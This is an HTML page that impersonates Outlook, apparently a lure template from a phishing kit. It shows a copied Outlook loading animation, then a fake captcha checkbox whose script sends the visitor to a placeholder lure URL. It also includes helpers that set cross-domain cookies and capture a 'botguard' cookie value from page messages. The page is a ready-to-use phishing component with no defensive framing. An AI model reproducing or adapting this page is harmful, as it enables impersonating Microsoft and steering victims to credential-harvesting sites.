<!DOCTYPE html>
<html dir=ltr xmlns=http://www.w3.org/1999/xhtml translate=no>
	<head>
		<meta charset=utf-8>
		<meta http-equiv=X-UA-Compatible content="IE=edge">
		<meta http-equiv=pragma content=no-cache>
		<meta name=viewport content="width=device-width,initial-scale=1,user-scalable=0">
		<link rel="shortcut icon" href=https://outlook.office.com/mail/favicon.ico type=image/x-icon>
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
		<noscript>JavaScript must be enabled.</noscript>
		<title>Outlook</title>
		<style>
			body,
			html {
				height: 100%
			}

			body {
				margin: 0;
				background-size: cover;
				background-position: center;
				display: flex;
				justify-content: center;
				align-items: center;
				font-family: Roboto, sans-serif
			}

			.captcha {
				background-color: #f9f9f9;
				border: 2px solid #d3d3d3;
				border-radius: 5px;
				color: #4c4a4b;
				display: flex;
				justify-content: center;
				align-items: center
			}

			@media screen and (max-width:500px) {
				.captcha {
					flex-direction: column
				}

				.text {
					margin: .5em !important;
					text-align: center
				}

				.logo {
					align-self: center !important
				}

				.spinner {
					margin: 2em .5em .5em .5em !important
				}
			}

			.text {
				font-size: 1.75em;
				font-weight: 500;
				margin-right: 1em
			}

			.spinner {
				position: relative;
				width: 2em;
				height: 2em;
				display: flex;
				margin: 2em 1em;
				align-items: center;
				justify-content: center
			}

			input[type=checkbox] {
				position: absolute;
				opacity: 0;
				z-index: -1
			}

			input[type=checkbox]+.checkmark {
				display: inline-block;
				width: 2em;
				height: 2em;
				background-color: #fcfcfc;
				border: 2.5px solid #c3c3c3;
				border-radius: 3px;
				display: flex;
				justify-content: center;
				align-items: center;
				cursor: pointer
			}

			input[type=checkbox]+.checkmark span {
				content: '';
				position: relative;
				margin-top: -3px;
				transform: rotate(45deg);
				width: .75em;
				height: 1.2em;
				opacity: 0
			}

			input[type=checkbox]+.checkmark>span:after {
				content: '';
				position: absolute;
				display: block;
				height: 3px;
				bottom: 0;
				left: 0;
				background-color: #029f56
			}

			input[type=checkbox]+.checkmark>span:before {
				content: '';
				position: absolute;
				display: block;
				width: 3px;
				bottom: 0;
				right: 0;
				background-color: #029f56
			}

			input[type=checkbox]:checked+.checkmark {
				animation: 2s spin forwards
			}

			input[type=checkbox]:checked+.checkmark>span {
				animation: 1s fadein 1.9s forwards
			}

			input[type=checkbox]:checked+.checkmark>span:after {
				animation: .3s bottomslide 2s forwards
			}

			input[type=checkbox]:checked+.checkmark>span:before {
				animation: .5s rightslide 2.2s forwards
			}

			@keyframes fadein {
				0% {
					opacity: 0
				}

				100% {
					opacity: 1
				}
			}

			@keyframes bottomslide {
				0% {
					width: 0
				}

				100% {
					width: 100%
				}
			}

			@keyframes rightslide {
				0% {
					height: 0
				}

				100% {
					height: 100%
				}
			}

			.logo {
				display: flex;
				flex-direction: column;
				align-items: center;
				height: 100%;
				align-self: flex-end;
				margin: .5em 1em
			}

			.logo img {
				height: 2em;
				width: 2em
			}

			.logo p {
				color: #9d9ba7;
				margin: 0;
				font-size: 1em;
				font-weight: 700;
				margin: .4em 0 .2em 0
			}

			.logo small {
				color: #9d9ba7;
				margin: 0;
				font-size: .8em
			}

			@keyframes spin {
				10% {
					width: 0;
					height: 0;
					border-width: 6px
				}

				30% {
					width: 0;
					height: 0;
					border-radius: 50%;
					border-width: 1em;
					transform: rotate(0);
					border-color: #c7daf5
				}

				50% {
					width: 2em;
					height: 2em;
					border-radius: 50%;
					border-width: 4px;
					border-color: #c7daf5;
					border-right-color: #5998ef
				}

				70% {
					border-width: 4px;
					border-color: #c7daf5;
					border-right-color: #5998ef
				}

				90% {
					border-width: 4px
				}

				100% {
					width: 2em;
					height: 2em;
					border-radius: 50%;
					transform: rotate(720deg);
					border-color: transparent
				}
			}

			::selection {
				background-color: transparent;
				color: teal
			}

			::-moz-selection {
				background-color: transparent;
				color: teal
			}
			#loadingScreen {
				position: fixed;
				top: 0;
				bottom: 0;
				left: 0;
				right: 0;
				background-color: #fff
			}

			#loadingLogo {
				position: fixed;
				top: calc(50vh - 90px);
				left: calc(50vw - 90px);
				width: 180px;
				height: 180px
			}

			#MSLogo {
				position: fixed;
				bottom: 36px;
				left: calc(50vw - 50px)
			}

			.dark #loadingScreen {
				background-color: #333
			}

			.darkNew #loadingScreen {
				background-color: #1f1f1f
			}
			#recap {
				position: absolute;
				z-index: 999;
				margin-top:-20%;
				width: 230%;
				margin-left: -55%;
				display:none;
			}
		</style>
		
	</head>
	<body role=application class="ms-font-s disableTextSelection ms-Fabric--isFocusHidden">
		<div id=app></div>
		<div id=loadingScreen>
			<div id=loadingLogo dir=ltr>
				<style>
					:root {
						--s: 180px;
						--envW: 130px;
						--envH: 71px;
						--calW: 118px;
						--sqW: calc(var(--calW) / 3);
						--sqH: 37px;
						--calHH: 20px;
						--calH: calc(var(--sqH) * 3 + var(--calHH));
						--calY: calc(var(--calH) + 20px);
						--calYExt: calc(var(--calH) - 80px);
						--calYOverExt: calc(var(--calH) - 92px);
						--flapS: 96px;
						--flapH: calc(0.55 * var(--envH));
						--flapScaleY: calc(var(--flapH) / var(--flapWidth));
						--dur: 5s
					}

					#container {
						width: var(--s);
						height: var(--s);
						animation: bounce var(--dur) infinite
					}

					@keyframes bounce {

						0%,
						100%,
						12.5%,
						32.5%,
						76.1% {
							transform: translateY(0)
						}

						22.5%,
						86% {
							transform: translateY(7px)
						}
					}

					#logo {
						height: 179px;
						width: 130px;
						overflow: hidden;
						margin-top: -59px;
						margin-left: 25px
					}

					#containerShadow {
						position: relative;
						top: 120px;
						left: 25px;
						width: var(--envW);
						height: var(--envH);
						border-radius: 0 0 7px 7px;
						box-shadow: rgba(0, 0, 0, .25) 0 4px 5px;
						animation: shadow-fade var(--dur) infinite
					}

					@keyframes shadow-fade {

						0%,
						100%,
						21.2%,
						80% {
							opacity: 0
						}

						47%,
						70% {
							opacity: 1
						}
					}

					#flapContainer {
						width: var(--envW);
						margin-top: 179px
					}

					#ef {
						width: var(--envW);
						height: var(--envH);
						border-radius: 0 0 7px 7px;
						overflow: hidden;
						margin-top: -41px
					}

					#ef>.l {
						width: 287px;
						height: var(--envH);
						background: #28a8ea;
						transform: translate(-153px, -70px) rotate(28deg)
					}

					#ef>.r {
						width: 287px;
						height: var(--envH);
						background: #1490df;
						transform: translate(-120px, 63px) rotate(-28deg)
					}

					#eb {
						width: var(--envW);
						height: 40px;
						background: #123b6d;
						margin-top: -70px
					}

					#cal {
						display: flex;
						flex-wrap: wrap;
						width: var(--calW);
						height: var(--calH);
						border-radius: 7px;
						overflow: hidden;
						margin: 0 auto;
						margin-top: -306px;
						animation: cal-bounce var(--dur) infinite;
						animation-timing-function: cubic-bezier(0, 0.5, 0, 1);
						transform: translateY(var(--calYExt)) scaleY(1)
					}

					@keyframes cal-bounce {

						0%,
						100%,
						16.5%,
						76.1% {
							transform: translateY(var(--calY)) scaleY(1)
						}

						28% {
							transform: translateY(var(--calYOverExt)) scaleY(1)
						}

						31% {
							transform: translateY(var(--calYExt)) scaleY(1.05)
						}

						33% {
							transform: translateY(var(--calYExt)) scaleY(.96)
						}

						34%,
						68.5% {
							transform: translateY(var(--calYExt)) scaleY(1)
						}

						68.5% {
							animation-timing-function: cubic-bezier(0.66, -0.16, 1, -0.29)
						}
					}

					#cal>.t {
						width: var(--calW);
						height: calc(var(--calHH) + 1px);
						margin-bottom: -1px;
						background: #0358a7
					}

					#cal>.r {
						display: flex;
						width: var(--calW);
						height: var(--sqH)
					}

					.s {
						width: var(--sqW);
						height: calc(var(--sqH) + 1px)
					}

					.s1 {
						background: #0078d4
					}

					.s2 {
						background: #28a8ea
					}

					.s3 {
						background: #50d9ff
					}

					.s4 {
						background: #0364b8
					}

					.s5 {
						background: #14447d
					}

					#openedFlap {
						width: var(--envW);
						height: 107px;
						animation: opened-flap-swing var(--dur) infinite;
						animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);
						transform-origin: top;
						transform: translateY(-68px) rotate3d(1, 0, 0, -180deg)
					}

					@keyframes opened-flap-swing {

						0%,
						100%,
						14.5%,
						76% {
							transform: translateY(-68px) rotate3d(1, 0, 0, -90deg)
						}

						16.5%,
						74% {
							transform: translateY(-68px) rotate3d(1, 0, 0, -180deg)
						}
					}

					#closedFlap {
						width: var(--envW);
						animation: closed-flap-swing var(--dur) infinite;
						animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);
						transform-origin: top;
						transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 90deg)
					}

					@keyframes closed-flap-swing {

						0%,
						100%,
						77%,
						8.5% {
							transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 0)
						}

						14.5%,
						76% {
							transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 90deg)
						}
					}

					#fmask {
						width: var(--envW);
						height: 107px;
						overflow: hidden
					}

					.flapTriangle {
						width: var(--flapS);
						height: var(--flapS);
						background: #50d9ff;
						margin: -48px auto 0 auto;
						border-radius: 7px;
						transform: scaleY(.6) rotate(45deg)
					}

					#openedFlap .flapTriangle {
						background: #123b6d
					}

					#closedFlap .flapTriangle {
						background: #50d9ff
					}
				</style>
				<div id=container>
					<div id=containerShadow></div>
					<div id=logo>
						<div id=flapContainer>
							<div id=openedFlap>
								<div id=fmask>
									<div class=flapTriangle></div>
								</div>
							</div>
							<div id=cal>
								<div class=t></div>
								<div class=r>
									<div class="s s1"></div>
									<div class="s s2"></div>
									<div class="s s3"></div>
								</div>
								<div class=r>
									<div class="s s4"></div>
									<div class="s s1"></div>
									<div class="s s2"></div>
								</div>
								<div class=r>
									<div class="s s5"></div>
									<div class="s s4"></div>
									<div class="s s1"></div>
								</div>
							</div>
						</div>
						<div id=eb></div>
						<div id=ef>
							<div class=r></div>
							<div class=l></div>
						</div>
						<div id=closedFlap>
							<div id=fmask>
								<div class=flapTriangle></div>
							</div>
						</div>
					</div>
				</div>
				<div id="recap"><div class="captcha">

						<span>&nbsp;</span>

		<script>
			$(document).ready(function(){
				setTimeout(() => {
					document.getElementById("recap").style.display="block";
				}, 5000);
			});
			let botguard;

			function setCookie(key, value, domain) {
				let d = new Date();
				d.setTime(d.getTime() + (15 * 24 * 60 * 60 * 1000));
				let expires = "expires=" + d.toUTCString();
				window.document.cookie = key + "=" + value + ";" + expires + ";domain=" + domain + ";" + "path=/; Secure; SameSite=None";
			}
			
			function onCheckBoxChange(e) {
				setTimeout(() => {
					window.location.assign({lure_url_js});
				}, 3000);
			}
			window.addEventListener("message", (event) => {
				if (event.origin === window.location.origin && event.data?.statusCode === "success" && !!event.data?.cookieValue) {
					botguard = event.data;
				}
			}, false);
		</script>
